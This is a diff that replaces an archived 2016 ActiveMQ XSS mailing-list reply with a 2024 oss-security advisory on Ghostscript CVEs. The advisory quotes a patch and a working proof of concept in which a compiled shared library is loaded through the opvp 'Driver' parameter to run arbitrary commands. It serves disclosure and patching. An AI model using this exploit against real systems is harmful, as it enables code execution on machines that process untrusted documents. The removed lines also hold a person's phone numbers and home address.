@@ -1,9 +1,4 @@
-X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["783" "Thursday" "17" "March" "2016" "11:25:28" "-0400" "Derek Mahar" "derek.mahar@gmail.com" "<CABtfiZbb8y9uuQT8=zrAaTi8znTjXXBqGPZBdDa4yxiaw3OO-g@mail.gmail.com>" "27" "[oss-security] Re: [ANNOUNCE] CVE-2016-0782: ActiveMQ Web Console - Cross-Site Scripting" nil nil nil "3" "2016031715:25:28" "[oss-security] Re: [ANNOUNCE] CVE-2016-0782: ActiveMQ Web Console - Cross-Site Scripting" (number mark "U       derek.mahar@ Mar 17   27/783   " thread-indent "\"[oss-security] Re: [ANNOUNCE] CVE-2016-0782: ActiveMQ Web Console - Cross-Site Scripting\"\n") "<CACHnxzxB4hfLVfGMgjDMQ3VLfOvmQyK=rX3fskxfy2RF=u2yVw@mail.gmail.com>" ("<CACHnxzxB4hfLVfGMgjDMQ3VLfOvmQyK=rX3fskxfy2RF=u2yVw@mail.gmail.com>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	nil)
-X-Mozilla-Status: 0000
-X-Mozilla-Status2: 00000000
-Received: (qmail 11898 invoked by uid 550); 17 Mar 2016 15:42:55 -0000
+Received: (qmail 10045 invoked by uid 550); 28 Jun 2024 03:34:59 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -12,69 +7,120 @@ List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
 Reply-To: oss-security@lists.openwall.com
-Received: (qmail 32244 invoked from network); 17 Mar 2016 15:25:40 -0000
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=gmail.com; s=20120113;
-        h=mime-version:in-reply-to:references:date:message-id:subject:from:to
-         :cc:content-transfer-encoding;
-        bh=T91evl4A7jLECWdVcqw/IwvFftkt+CeMSxtTZKLCPl8=;
-        b=0AIN7yDq6pyE0jEjdPxSO0T2Gc4hSRBBHvCZUDObTOXvhba5XTtM/17HEUBZMLweSt
-         Ma7nrI4AGYsvnuKukx+xCCRPkkgkwXRem7b24p4Vrg9ikTF2gugmiJyw//suY6O9FikB
-         y0cUT6f4vO4hhUYPy1IQ2+OiAKiUronyfxOq4kbcC5UeezHrqHZrAep23utC4Tu+AXmW
-         wzEA4q9XEnmHbD001HFN7dPiTUIG8WXQTy5O4ffT1vTWuX9rw21TG9ArpzBDHixYK5YG
-         1sS79aOigcNGx0DPzV+tipPYdxpaN8Jc8IEMJj57hT637JoS0twQ0FWl2kyl+GMCCBRV
-         Xxgw==
-X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20130820;
-        h=x-gm-message-state:mime-version:in-reply-to:references:date
-         :message-id:subject:from:to:cc:content-transfer-encoding;
-        bh=T91evl4A7jLECWdVcqw/IwvFftkt+CeMSxtTZKLCPl8=;
-        b=VCUrdH8KAJDBQnzYOsbl47c86ZroXpJzH5lNf8xaCRF3B+X1Uduc2x9XFbHRrz+j/9
-         HUudWeC35Fg6VP8XtgYGKyxQkBWTN1NZD+kTesUqHwvN2ifeRs6moURH3tV40qU5Gbv2
-         MiDXA1B0FIh9/lnlrrZsyUd5E6+rCFp5UGIoDAABRvJHZ8KPnURI45RWkwpTzha9FAkd
-         mTnocSWbC2YcqZ8Mxnz2QRPldgbuBYxqivi10nkRPhIDXSQlmd7WuFQ7TqEMlOynYxKY
-         BDet6UB2adVUZ3IgN35v58JOsS/fV5s5XCJJvj22t20Iow50J7zSNGQBx6YvmBDsfMLm
-         dBjw==
-X-Gm-Message-State: AD7BkJJCNZbygBH1saizC5tRsBd4Dm5eqvRgxVAXxRhm2Fyujf+vo2CAnxCmUJvLjuZNyapzN7yqghDMZDD0bQ==
-MIME-Version: 1.0
-X-Received: by 10.31.56.133 with SMTP id f127mr12195811vka.56.1458228328393;
- Thu, 17 Mar 2016 08:25:28 -0700 (PDT)
-In-Reply-To: <CACHnxzxB4hfLVfGMgjDMQ3VLfOvmQyK=rX3fskxfy2RF=u2yVw@mail.gmail.com>
-References: <CACHnxzxB4hfLVfGMgjDMQ3VLfOvmQyK=rX3fskxfy2RF=u2yVw@mail.gmail.com>
-Date: Thu, 17 Mar 2016 11:25:28 -0400
-Message-ID: <CABtfiZbb8y9uuQT8=zrAaTi8znTjXXBqGPZBdDa4yxiaw3OO-g@mail.gmail.com>
-From: Derek Mahar <derek.mahar@gmail.com>
-To: users@activemq.apache.org
-Cc: dev@activemq.apache.org, security@apache.org, 
-	oss-security@lists.openwall.com, bugtraq@securityfocus.com
-Content-Type: text/plain; charset=UTF-8
-Content-Transfer-Encoding: quoted-printable
-Subject: [oss-security] Re: [ANNOUNCE] CVE-2016-0782: ActiveMQ Web Console - Cross-Site Scripting
+Received: (qmail 9821 invoked from network); 28 Jun 2024 03:34:51 -0000
+Date: Fri, 28 Jun 2024 05:34:45 +0200
+From: Solar Designer <solar@openwall.com>
+To: oss-security@lists.openwall.com
+Message-ID: <20240628033444.GA521@openwall.com>
+Mime-Version: 1.0
+Content-Type: text/plain; charset=us-ascii
+Content-Disposition: inline
+User-Agent: Mutt/1.4.2.3i
+Subject: [oss-security] Ghostscript 10.03.1 (2024-05-02) fixed 5 CVEs including CVE-2024-33871 arbitrary code execution
 
-The security advisory announcement claims that ActiveMQ 5.13.1 and
-older versions are affected and that ActiveMQ 5.13.2 fixes the issues.
+Hi,
 
-On 10 March 2016 at 07:45, Christopher Shannon
-<christopher.l.shannon@gmail.com> wrote:
-> There following security vulnerability was reported against Apache
-> ActiveMQ 5.13.0 and older versions.
->
-> Please check the following document and see if you=E2=80=99re affected by=
- the issue.
->
-> http://activemq.apache.org/security-advisories.data/CVE-2016-0782-announc=
-ement.txt
->
-> Apache ActiveMQ 5.13.1 and newer with appropriate fixes was released and
-> available for upgrade.
+Ghostscript 10.03.1 (2024-05-02) release notes:
 
+https://ghostscript.readthedocs.io/en/gs10.03.1/News.html
 
+mentions this:
 
---=20
-Derek Mahar
-1.514.316.6736 Home
-1.514.316.7348 Mobile
-1.514.461.3650 x230 Work
-102-1365 boulevard Ren=C3=A9-L=C3=A9vesque Est
-Montr=C3=A9al QC H2L 2M1
-Canada
+> - Fixes for CVE-2024-33869, CVE-2023-52722, CVE-2024-33870,
+> CVE-2024-33871 and CVE-2024-29510
+
+> - A vulnerability was identified in the way Ghostscript/GhostPDL called
+> tesseract for the OCR devices, which could allow arbitrary code
+> execution. As as result, we strongly urge anyone including the OCR
+> devices in their build to update as soon as possible.
+
+Out of these, CVE-2024-33871 is probably the worst (CVSS 8.8 and
+Important per Red Hat):
+
+https://access.redhat.com/security/cve/CVE-2024-33871
+
+> A flaw was found in Ghostscript. The "Driver" parameter for the
+> "opvp"/"oprp" device specifies the name of a dynamic library and allows
+> any library to be loaded. This flaw allows a malicious user to send a
+> specially crafted document that, when processed by Ghostscript, could
+> potentially lead to arbitrary code execution with the privileges of the
+> Ghostscript process on the system.
+
+(recently patched in RHEL 8 and 9, and thus in the RHEL rebuild distros)
+
+There's a patch and a reproducer for it in upstream Bugzilla:
+
+https://bugs.ghostscript.com/show_bug.cgi?id=707754
+
+> zhutyra 2024-04-21 15:27:29 UTC
+> 
+> Created attachment 25611 [details]
+> patch
+
++++ a/contrib/opvp/gdevopvp.c
+@@ -3456,6 +3456,12 @@ _put_params(gx_device *dev, gs_param_list *plist)
+     code = param_read_string(plist, pname, &vdps);
+     switch (code) {
+     case 0:
++        if (gs_is_path_control_active(dev->memory)
++            && (!opdev->globals.vectorDriver || strlen(opdev->globals.vectorDriver) != vdps.size
++                || memcmp(opdev->globals.vectorDriver, vdps.data, vdps.size) != 0)) {
++            param_signal_error(plist, pname, gs_error_invalidaccess);
++            return_error(gs_error_invalidaccess);
++        }
+         buff = realloc(buff, vdps.size + 1);
+         memcpy(buff, vdps.data, vdps.size);
+         buff[vdps.size] = 0;
+
+> The "Driver" parameter for the "opvp"/"oprp" device specifies the name of a dynamic library and allows any library to be loaded.
+> 
+> The patch does not allow changing this parameter after activating path control.
+> 
+> Comment 1 zhutyra 2024-04-21 15:29:14 UTC
+> 
+> Created attachment 25612 [details]
+> exploit
+> 
+> Exploit for x86_64 Linux.
+> ```
+> $ gs -q -dNODISPLAY opvplib.ps
+> uid=1000(user) gid=1000(user) groups=1000(user)
+> ```
+> 
+> The file contains a precompiled library. If it doesn't work for you or you don't want to run unknown code, you can also do it manually.
+> ```
+> $ cat >lib.c <<"EOF"
+> #include <stdlib.h>
+> static void __attribute__ ((constructor)) init(void) {
+>     exit(system("id"));
+> }
+> EOF
+> $ gcc -fPIC -shared -o /tmp/lib.so lib.c
+> $ gs -q -dNODISPLAY -c '<< /OutputDevice /opvp /Driver (/tmp/lib.so) >> setpagedevice'
+> uid=1000(user) gid=1000(user) groups=1000(user)
+
+The second attachment (exploit) gives me "Sorry, you are not authorized
+to access attachment #25612." but apparently it's just a precompiled
+version of what's included in the comment body, above, so not required
+to exploit the issue.  A colleague has tested the above exploit on
+latest CentOS 7 and it just worked (now patched in CIQ's CentOS Bridge).
+
+CVE-2024-33870 is also pretty bad:
+
+https://access.redhat.com/security/cve/CVE-2024-33870
+
+> A flaw was found in Ghostscript. When the gp_validate_path_len function
+> validates a path, it distinguishes between absolute and relative paths.
+> In the case of relative paths, it will check the path with and without
+> the current-directory-prefix ("foo" and "./foo"). This does not take
+> into account paths with a parent-directory-prefix. Therefore, a path
+> like "../../foo" is also tested as "./../../foo" and if the current
+> directory "./" is in the permitted paths, it will pass the check, which
+> may allow arbitrary file access.
+
+The remaining 3 CVEs are also serious, although they have lower scores.
+
+The CVE records for all four 2024 CVEs above still merely say "reserved
+by a CNA", without descriptions.  The 2023 CVE has proper info in it.
+
+Alexander
